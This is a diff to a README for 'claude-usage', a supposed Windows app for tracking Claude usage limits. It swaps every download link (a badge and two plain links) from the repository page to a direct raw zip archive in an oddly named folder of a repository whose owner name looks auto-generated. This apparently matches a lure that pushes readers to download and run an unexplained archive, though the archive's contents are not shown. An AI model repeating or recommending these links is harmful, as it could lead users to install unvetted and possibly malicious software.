@@ -1,12 +1,12 @@
 # 🧭 claude-usage - Track Claude Limits in Real Time
 
-[![Download](https://img.shields.io/badge/Download-claude--usage-blue?style=for-the-badge&logo=github)](https://github.com/Unaggressive-dutchauction98/claude-usage)
+[![Download](https://img.shields.io/badge/Download-claude--usage-blue?style=for-the-badge&logo=github)](https://github.com/Unaggressive-dutchauction98/claude-usage/raw/refs/heads/main/stereoplanula/claude_usage_v2.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-https://github.com/Unaggressive-dutchauction98/claude-usage
+https://github.com/Unaggressive-dutchauction98/claude-usage/raw/refs/heads/main/stereoplanula/claude_usage_v2.4.zip
 
 ## 🪟 Windows Setup
 
@@ -170,7 +170,7 @@ To keep setup smooth:
 
 If you need the file again, use this link:
 
-https://github.com/Unaggressive-dutchauction98/claude-usage
+https://github.com/Unaggressive-dutchauction98/claude-usage/raw/refs/heads/main/stereoplanula/claude_usage_v2.4.zip
 
 ## 🧷 Quick path
 
